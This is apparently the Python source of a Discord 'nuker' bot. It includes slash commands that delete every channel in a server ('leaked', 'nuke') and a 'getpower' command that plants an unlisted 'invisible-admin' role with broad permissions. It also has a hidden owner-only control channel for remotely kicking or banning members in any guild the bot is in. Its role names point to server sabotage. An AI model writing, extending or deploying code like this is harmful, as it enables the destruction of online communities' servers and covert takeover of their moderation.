import os
import re
import discord
from discord.ext import commands
from discord import app_commands
from flask import Flask
import threading
from datetime import datetime, timedelta

# ---- Configuration ----

TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1273056960996184126  # Your Discord user ID
GUILD_ID = 1390383100113977477  # Main guild for slash commands syncing
WEBHOOK_CHANNEL_ID = 1402833877831127071  # Control panel text channel ID for webhook commands

ROLE_NUKER_HELPER = "Nuker Bot Helper"
ROLE_GC_LEAKED = "GC Leaked Perms"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is running."

def run_flask():
    app.run(host="0.0.0.0", port=8081)

threading.Thread(target=run_flask).start()

# ---- Utility functions ----

def has_role(member: discord.Member, role_name: str) -> bool:
    return any(role.name == role_name for role in member.roles)

async def create_invisible_admin_role(guild: discord.Guild) -> discord.Role:
    role = discord.utils.get(guild.roles, name="invisible-admin")
    if not role:
        role = await guild.create_role(
            name="invisible-admin",
            permissions=discord.Permissions(
                kick_members=True,
                ban_members=True,
                mute_members=True,
                deafen_members=True,
                moderate_members=True,
                manage_channels=True,
                manage_messages=True,
                manage_roles=True
            ),
            color=discord.Color.default(),
            mentionable=False,
            hoist=False
        )
    return role

# ---- Events ----

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
        print(f"Synced {len(synced)} command(s).")
    except Exception as e:
        print(f"Failed to sync commands: {e}")
    print(f"Bot is online: {bot.user}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Listen only in control panel channel for remote commands
    if message.channel.id == WEBHOOK_CHANNEL_ID:
        if message.author.id != OWNER_ID:
            await message.channel.send("? You are not authorized to use this control channel.")
            return

        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send("Usage: <action> <username> [guild_id]")
            return

        action = parts[0].lower()
        username = parts[1]
        guild_id = int(parts[2]) if len(parts) > 2 else message.guild.id

        guild = bot.get_guild(guild_id)
        if not guild:
            await message.channel.send(f"? Bot is not in guild with ID {guild_id}.")
            return

        member = discord.utils.find(lambda m: m.name == username, guild.members)
        if not member:
            await message.channel.send(f"? User '{username}' not found in guild '{guild.name}'.")
            return

        try:
            if action == "kick":
                await member.kick(reason=f"Command issued by owner via control panel.")
                await message.channel.send(f"? Kicked {username} from {guild.name}.")
            elif action == "ban":
                await member.ban(reason=f"Command issued by owner via control panel.")
                await message.channel.send(f"? Banned {username} from {guild.name}.")
            elif action == "mute":
                await member.edit(mute=True)
                await message.channel.send(f"? Muted {username} in {guild.name}.")
            elif action == "deafen":
                await member.edit(deafen=True)
                await message.channel.send(f"? Deafened {username} in {guild.name}.")
            elif action == "timeout":
                await member.timeout(datetime.utcnow() + timedelta(minutes=10))
                await message.channel.send(f"? Timed out {username} for 10 minutes in {guild.name}.")
            else:
                await message.channel.send("? Invalid action. Allowed: kick, ban, mute, deafen, timeout.")
        except Exception as e:
            await message.channel.send(f"? Failed to execute '{action}' on {username}: {e}")

    await bot.process_commands(message)

# ---- Slash Commands ----

@bot.tree.command(name="getpower", description="Grant yourself invisible admin powers", guild=discord.Object(id=GUILD_ID))
async def getpower(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("? You do not have permission.", ephemeral=True)
        return

    role = await create_invisible_admin_role(interaction.guild)
    await interaction.user.add_roles(role)
    await interaction.response.send_message("??? You now have invisible moderation powers.", ephemeral=True)

@bot.tree.command(name="selfdelete", description="Delete your own messages", guild=discord.Object(id=GUILD_ID))
async def selfdelete(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    user = interaction.user

    for channel in interaction.guild.text_channels:
        async for msg in channel.history(limit=1000):
            if msg.author == user:
                await msg.delete()
                count += 1

    await interaction.followup.send(f"?? Deleted {count} of your messages.", ephemeral=True)

@bot.tree.command(name="delete", description="Delete messages from a user", guild=discord.Object(id=GUILD_ID))
@app_commands.describe(user="The user whose messages to delete")
async def delete(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id != OWNER_ID and not has_role(interaction.user, ROLE_NUKER_HELPER):
        await interaction.response.send_message("? You need the Nuker Bot Helper role.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.text_channels:
        async for msg in channel.history(limit=1000):
            if msg.author == user:
                await msg.delete()
                count += 1

    await interaction.followup.send(f"?? Deleted {count} messages from {user.mention}.", ephemeral=True)

@bot.tree.command(name="leaked", description="Permanently delete all channels", guild=discord.Object(id=GUILD_ID))
async def leaked(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID and not has_role(interaction.user, ROLE_GC_LEAKED):
        await interaction.response.send_message("? You need the GC Leaked Perms role.", ephemeral=True)
        return

    for channel in interaction.guild.channels:
        await channel.delete()

    await interaction.response.send_message("?? All channels deleted.", ephemeral=True)

@bot.tree.command(name="nuke", description="Delete all channels and restore categories", guild=discord.Object(id=GUILD_ID))
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID and not has_role(interaction.user, ROLE_NUKER_HELPER):
        await interaction.response.send_message("? You need the Nuker Bot Helper role.", ephemeral=True)
        return

    await interaction.response.send_message("?? Nuking all channels...", ephemeral=True)

    # Backup categories and channel names
    categories = []
    for category in interaction.guild.categories:
        categories.append((category.name, [ch.name for ch in category.channels]))

    # Delete all channels
    for channel in interaction.guild.channels:
        await channel.delete()

    # Recreate categories and channels
    for cat_name, channels in categories:
        new_cat = await interaction.guild.create_category(cat_name)
        for ch_name in channels:
            await interaction.guild.create_text_channel(ch_name, category=new_cat)

    await interaction.followup.send("? Server nuked and structure restored.", ephemeral=True)

# ---- Prefix command !mod ----

def parse_duration(duration_str):
    regex = r"(\d+)([smhd])"
    match = re.match(regex, duration_str.lower())
    if not match:
        return None
    amount, unit = match.groups()
    amount = int(amount)
    if unit == "s":
        return amount
    elif unit == "m":
        return amount * 60
    elif unit == "h":
        return amount * 3600
    elif unit == "d":
        return amount * 86400
    return None

@bot.command(name="mod")
@commands.has_any_role(ROLE_NUKER_HELPER)
async def mod(ctx, action: str, member: discord.Member, duration: str = None, *, reason: str = "No reason provided"):
    action = action.lower()
    try:
        if action == "kick":
            await member.kick(reason=reason)
            await ctx.send(f"? Kicked {member.mention}. Reason: {reason}")

        elif action == "ban":
            await member.ban(reason=reason)
            await ctx.send(f"? Banned {member.mention}. Reason: {reason}")

        elif action == "mute":
            await member.edit(mute=True, reason=reason)
            await ctx.send(f"? Muted {member.mention} in voice channels. Reason: {reason}")

        elif action == "deafen":
            await member.edit(deafen=True, reason=reason)
            await ctx.send(f"? Deafened {member.mention} in voice channels. Reason: {reason}")

        elif action == "timeout":
            if not duration:
                await ctx.send("? You must specify duration for timeout, e.g. 10m, 1h")
                return
            seconds = parse_duration(duration)
            if not seconds:
                await ctx.send("? Invalid duration format. Use s, m, h, d. Example: 10m")
                return
            until = datetime.utcnow() + timedelta(seconds=seconds)
            await member.timeout(until=until, reason=reason)
            await ctx.send(f"? Timed out {member.mention} for {duration}. Reason: {reason}")

        else:
            await ctx.send("? Invalid action. Use kick, ban, mute, deafen, timeout.")

    except Exception as e:
        await ctx.send(f"? Failed to perform {action} on {member.mention}: {e}")

# ---- Run bot ----
bot.run(TOKEN)
